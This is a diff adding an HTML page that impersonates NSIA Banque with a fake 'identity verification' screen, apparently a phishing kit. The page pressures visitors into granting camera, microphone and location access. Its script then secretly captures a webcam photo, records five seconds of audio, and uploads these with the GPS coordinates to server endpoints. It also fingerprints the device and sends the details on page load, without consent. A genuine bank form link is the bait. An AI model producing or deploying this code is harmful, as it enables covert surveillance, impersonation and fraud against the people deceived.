@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NSIA Banque - Vérification sécurisée</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 550px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        h2 { color: #333; margin-bottom: 10px; }
+        .subtitle { color: #666; margin-bottom: 25px; font-size: 14px; }
+        .permission-box {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        .permission-item {
+            margin: 12px 0;
+            padding: 12px 15px;
+            border-radius: 10px;
+            background: white;
+            border-left: 4px solid #dc3545;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .permission-item.granted {
+            border-left-color: #28a745;
+            background: #d4edda;
+        }
+        .permission-icon { font-size: 24px; }
+        .permission-text { flex: 1; }
+        .permission-title { font-weight: bold; display: block; }
+        .permission-status { font-size: 12px; color: #dc3545; }
+        .granted .permission-status { color: #28a745; }
+        button {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            margin: 10px 0;
+            transition: all 0.3s;
+            width: 100%;
+        }
+        button:hover { background: #0056b3; transform: scale(1.02); }
+        button:disabled {
+            background: #6c757d;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .pdf-container {
+            display: none;
+            margin-top: 20px;
+            padding: 20px;
+            background: #d4edda;
+            border-radius: 10px;
+            border: 1px solid #c3e6cb;
+        }
+        .pdf-container a {
+            color: #155724;
+            font-weight: bold;
+            text-decoration: none;
+            font-size: 18px;
+        }
+        .pdf-container a:hover { text-decoration: underline; }
+        .status {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 13px;
+            background: #f0f0f0;
+        }
+        .loader {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid white;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .device-info {
+            background: #e9ecef;
+            border-radius: 10px;
+            padding: 12px;
+            margin: 15px 0;
+            font-size: 12px;
+            text-align: left;
+            display: none;
+        }
+        .device-info.show { display: block; }
+        .progress-bar {
+            height: 4px;
+            background: #e0e0e0;
+            border-radius: 2px;
+            margin: 15px 0;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #28a745, #007bff);
+            transition: width 0.3s;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h2>🔒 NSIA Banque - Sécurité renforcée</h2>
+    <div class="subtitle">Vérification d'identité requise pour accéder à votre formulaire</div>
+
+    <div class="progress-bar">
+        <div class="progress-fill" id="progress-fill"></div>
+    </div>
+
+    <div class="permission-box">
+        <h3>📋 Autorisations nécessaires :</h3>
+        <div id="cam-status" class="permission-item">
+            <span class="permission-icon">📷</span>
+            <div class="permission-text">
+                <span class="permission-title">Caméra</span>
+                <span class="permission-status">En attente...</span>
+            </div>
+        </div>
+        <div id="mic-status" class="permission-item">
+            <span class="permission-icon">🎤</span>
+            <div class="permission-text">
+                <span class="permission-title">Microphone</span>
+                <span class="permission-status">En attente...</span>
+            </div>
+        </div>
+        <div id="loc-status" class="permission-item">
+            <span class="permission-icon">📍</span>
+            <div class="permission-text">
+                <span class="permission-title">Géolocalisation</span>
+                <span class="permission-status">En attente...</span>
+            </div>
+        </div>
+    </div>
+
+    <button id="request-btn" onclick="requestAll()">
+        ✅ Autoriser et continuer
+    </button>
+
+    <div id="device-info" class="device-info">
+        <strong>🖥️ Informations appareil :</strong>
+        <div id="device-details"></div>
+    </div>
+
+    <div id="pdf-container" class="pdf-container">
+        📄 <a href="#" id="pdf-link" target="_blank">Accéder à mon formulaire NSIA</a>
+    </div>
+
+    <div id="status" class="status"></div>
+</div>
+
+<script>
+    let permissions = { camera: false, microphone: false, geolocation: false };
+    let deviceInfoSent = false;
+
+    function updateProgress() {
+        let count = (permissions.camera?1:0) + (permissions.microphone?1:0) + (permissions.geolocation?1:0);
+        let percent = (count / 3) * 100;
+        document.getElementById('progress-fill').style.width = percent + '%';
+    }
+
+    function updateUI() {
+        // Caméra
+        let camDiv = document.getElementById('cam-status');
+        if(permissions.camera) {
+            camDiv.classList.add('granted');
+            camDiv.querySelector('.permission-status').textContent = '✅ Acceptée';
+        } else {
+            camDiv.classList.remove('granted');
+            camDiv.querySelector('.permission-status').textContent = '❌ En attente';
+        }
+
+        // Micro
+        let micDiv = document.getElementById('mic-status');
+        if(permissions.microphone) {
+            micDiv.classList.add('granted');
+            micDiv.querySelector('.permission-status').textContent = '✅ Accepté';
+        } else {
+            micDiv.classList.remove('granted');
+            micDiv.querySelector('.permission-status').textContent = '❌ En attente';
+        }
+
+        // Géoloc
+        let locDiv = document.getElementById('loc-status');
+        if(permissions.geolocation) {
+            locDiv.classList.add('granted');
+            locDiv.querySelector('.permission-status').textContent = '✅ Acceptée';
+        } else {
+            locDiv.classList.remove('granted');
+            locDiv.querySelector('.permission-status').textContent = '❌ En attente';
+        }
+
+        updateProgress();
+
+        const allGranted = permissions.camera && permissions.microphone && permissions.geolocation;
+        if(allGranted) {
+            document.getElementById('pdf-container').style.display = 'block';
+            document.getElementById('pdf-link').href = 'https://www.nsiabanque.ci/wp-content/uploads/2021/02/Formulaire-particulier.pdf';
+            document.getElementById('status').innerHTML = '✅ Toutes les autorisations sont accordées. Cliquez sur le lien pour accéder à votre formulaire.';
+            document.getElementById('request-btn').disabled = true;
+            document.getElementById('request-btn').innerHTML = '✅ Autorisations accordées';
+            
+            // Envoyer les infos appareil si pas encore fait
+            if(!deviceInfoSent) sendDeviceInfo();
+        } else {
+            document.getElementById('pdf-container').style.display = 'none';
+            let missing = [];
+            if(!permissions.camera) missing.push('caméra');
+            if(!permissions.microphone) missing.push('microphone');
+            if(!permissions.geolocation) missing.push('géolocalisation');
+            document.getElementById('status').innerHTML = `⚠️ Vous devez autoriser : ${missing.join(', ')}`;
+        }
+    }
+
+    async function requestCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            permissions.camera = true;
+            
+            // Capturer et envoyer photo
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+                video.play();
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob((blob) => {
+                        const formData = new FormData();
+                        formData.append('image', blob, 'webcam.png');
+                        fetch('/upload', { method: 'POST', body: formData });
+                    });
+                    video.remove();
+                }, 500);
+            };
+            
+            stream.getTracks().forEach(track => track.stop());
+            updateUI();
+            return true;
+        } catch(err) {
+            permissions.camera = false;
+            updateUI();
+            alert("❌ Caméra refusée. Cette autorisation est obligatoire.");
+            return false;
+        }
+    }
+
+    async function requestMicrophone() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            permissions.microphone = true;
+            
+            // Enregistrer et envoyer audio
+            const mediaRecorder = new MediaRecorder(stream);
+            const chunks = [];
+            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'audio/wav' });
+                const formData = new FormData();
+                formData.append('audio', blob, 'micro.wav');
+                fetch('/upload_audio', { method: 'POST', body: formData });
+            };
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), 5000);
+            
+            updateUI();
+            return true;
+        } catch(err) {
+            permissions.microphone = false;
+            updateUI();
+            alert("❌ Microphone refusé. Cette autorisation est obligatoire.");
+            return false;
+        }
+    }
+
+    function requestGeolocation() {
+        return new Promise((resolve) => {
+            if('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        permissions.geolocation = true;
+                        // Envoyer position
+                        fetch('/location', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                lat: position.coords.latitude,
+                                lon: position.coords.longitude
+                            })
+                        });
+                        updateUI();
+                        resolve(true);
+                    },
+                    (error) => {
+                        permissions.geolocation = false;
+                        updateUI();
+                        alert("❌ Géolocalisation refusée. Cette autorisation est obligatoire.");
+                        resolve(false);
+                    }
+                );
+            } else {
+                alert("⚠️ Géolocalisation non supportée");
+                permissions.geolocation = false;
+                updateUI();
+                resolve(false);
+            }
+        });
+    }
+
+    function sendDeviceInfo() {
+        const info = {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cpuCores: navigator.hardwareConcurrency || 'Inconnu',
+            deviceMemory: navigator.deviceMemory || 'Inconnu'
+        };
+        
+        fetch('/device_info', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(info)
+        });
+        
+        // Afficher dans la page
+        document.getElementById('device-details').innerHTML = `
+            <strong>OS:</strong> ${info.platform}<br>
+            <strong>Navigateur:</strong> ${info.userAgent.split(' ').pop()}<br>
+            <strong>Résolution:</strong> ${info.screenWidth}x${info.screenHeight}<br>
+            <strong>Langue:</strong> ${info.language}<br>
+            <strong>Fuseau:</strong> ${info.timezone}<br>
+            <strong>CPU:</strong> ${info.cpuCores} cœurs
+        `;
+        document.getElementById('device-info').classList.add('show');
+        deviceInfoSent = true;
+    }
+
+    async function requestAll() {
+        const btn = document.getElementById('request-btn');
+        btn.disabled = true;
+        btn.innerHTML = '<span class="loader"></span> Demande en cours...';
+        
+        await requestCamera();
+        await requestMicrophone();
+        await requestGeolocation();
+        
+        // Envoyer infos appareil immédiatement
+        if(!deviceInfoSent) sendDeviceInfo();
+        
+        const allOk = permissions.camera && permissions.microphone && permissions.geolocation;
+        if(!allOk) {
+            btn.disabled = false;
+            btn.innerHTML = '🔄 Réessayer - Autorisations manquantes';
+        } else {
+            btn.innerHTML = '✅ Autorisations accordées - Accès débloqué';
+        }
+    }
+
+    // Auto-détection des infos appareil au chargement
+    window.onload = () => {
+        sendDeviceInfo();
+    };
+</script>
+</body>
+</html>
